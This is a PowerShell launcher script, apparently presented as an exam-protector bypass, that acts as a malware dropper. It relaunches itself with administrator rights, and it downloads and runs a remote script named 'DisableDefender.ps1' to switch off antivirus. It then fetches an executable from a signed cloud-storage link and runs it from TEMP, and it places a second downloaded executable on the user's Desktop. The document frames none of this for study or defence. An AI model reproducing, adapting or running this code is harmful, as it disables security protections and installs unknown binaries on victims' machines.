# ================================================================
# FULL OUTPUT LAUNCHER + DESKTOP DROP
# ================================================================

# ---- SET THIS TO YOUR RAW GITHUB URL ----
$myUrl = "https://raw.githubusercontent.com/examprotectorbypass/jjs/refs/heads/main/lunch.ps1"

Write-Host ""
Write-Host "================================================================" -ForegroundColor DarkCyan
Write-Host " LAUNCHER START"
Write-Host "================================================================" -ForegroundColor DarkCyan
Write-Host "Time       : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
Write-Host "User       : $env:USERNAME"
Write-Host "Computer   : $env:COMPUTERNAME"
Write-Host "PWD        : $PWD"
Write-Host "PSVersion  : $($PSVersionTable.PSVersion)"
Write-Host "ProcessID  : $PID"

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "IsAdmin    : $isAdmin"

if (-not $isAdmin) {
    Write-Host ""
    Write-Host "================================================================" -ForegroundColor DarkCyan
    Write-Host " NOT ADMIN - relaunching elevated - UAC prompt should appear"
    Write-Host "================================================================" -ForegroundColor DarkCyan

    # 'irm | iex' has no script path, so re-download ourselves to a temp file
    $tmpScript = Join-Path $env:TEMP ("launcher_" + [guid]::NewGuid().ToString() + ".ps1")
   
    try {
        Invoke-RestMethod -Uri $myUrl -OutFile $tmpScript -ErrorAction Stop
       
    } catch {
   
        return
    }

    
    $child = Start-Process powershell.exe -Verb RunAs -Wait -PassThru -ArgumentList @(
        "-NoProfile","-ExecutionPolicy","Bypass","-File",$tmpScript
    )
   
    Remove-Item $tmpScript -Force -ErrorAction SilentlyContinue
  
    return
}

$ErrorActionPreference = 'Continue'

# ---- Step 1: Defender ----

$defenderUrl = "https://raw.githubusercontent.com/examprotectorbypass/jjs/refs/heads/main/DisableDefender.ps1"

try {
    $defenderScript = Invoke-RestMethod -Uri $defenderUrl -ErrorAction Stop
   
    Invoke-Expression $defenderScript
} catch {
   
}

# ---- Step 2: Download xleetets.exe ----

$url = 'https://uddxinkwpjvqdxnaqelw.supabase.co/storage/v1/object/sign/myfiles/all_D.exe?token=eyJraWQiOiIzYmU3ZTlhOS1hNTk5LTQ3NWMtOWU5OS0yZTRhODI5MDIzNTQiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJteWZpbGVzL2FsbF9ELmV4ZSIsInNjb3BlIjoiZG93bmxvYWQiLCJpYXQiOjE3ODk2NDEyNDEsImV4cCI6MjEwNTAwMTI0MX0.QbluSPWJx6WdK4_2XoDWpe2Q9XYtgVVvF_hTthIVdlw'
$out = Join-Path $env:TEMP 'xleetets.exe'



if (Test-Path $out) {
   
    Remove-Item $out -Force -ErrorAction SilentlyContinue
}


curl.exe -L --fail --progress-bar -o $out $url
$curlExit = $LASTEXITCODE


if (Test-Path $out) {
    $fi = Get-Item $out

} else {

    return
}

# ---- Step 3: Launch xleetets.exe ----
 "================================================================" -ForegroundColor DarkCyan

try {
    $proc = Start-Process -FilePath $out -WorkingDirectory $env:TEMP -PassThru -ErrorAction Stop
   

    Start-Sleep -Seconds 5

    $still = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
    if ($still) {
  
    } else {
      
    }
} catch {
   
}

# ---- Step 4: Download Dwluncher.exe to Desktop (no launch) ----


$dwUrl = 'https://uddxinkwpjvqdxnaqelw.supabase.co/storage/v1/object/sign/myfiles/Dwluncher.exe?token=eyJraWQiOiIzYmU3ZTlhOS1hNTk5LTQ3NWMtOWU5OS0yZTRhODI5MDIzNTQiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJteWZpbGVzL0R3bHVuY2hlci5leGUiLCJzY29wZSI6ImRvd25sb2FkIiwiaWF0IjoxNzg5NjM2NzMwLCJleHAiOjI0MjAzNTY3MzB9.Ky8yFMWdmlANKKjKDk8EV2F82h__tlV7o5p2gwxRzzI'

# Resolve the actual user's Desktop even when running as admin
$desktop = [Environment]::GetFolderPath('Desktop')
if (-not $desktop -or -not (Test-Path $desktop)) {
    $desktop = Join-Path $env:USERPROFILE 'Desktop'
}

# When elevated, $env:USERPROFILE points to the admin's profile, not the real user's.
# Use the original interactive user's desktop via the explorer process owner if possible.
try {
    $explorer = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($explorer) {
        $owner = Invoke-CimMethod -InputObject $explorer -MethodName GetOwner -ErrorAction SilentlyContinue
        if ($owner -and $owner.User) {
            $realProfile = "C:\Users\$($owner.User)"
            $realDesktop = Join-Path $realProfile 'Desktop'
            if (Test-Path $realDesktop) {
                $desktop = $realDesktop
                
            }
        }
    }
} catch {
    
}

$dwOut = Join-Path $desktop 'Dwluncher.exe'



if (Test-Path $dwOut) {
    
}


curl.exe -L --fail --progress-bar -o $dwOut $dwUrl
$dwExit = $LASTEXITCODE


if (Test-Path $dwOut) {
    $dfi = Get-Item $dwOut

} else {
    
}



try {
    $mp = Get-MpComputerStatus -ErrorAction Stop

} catch {
    
}

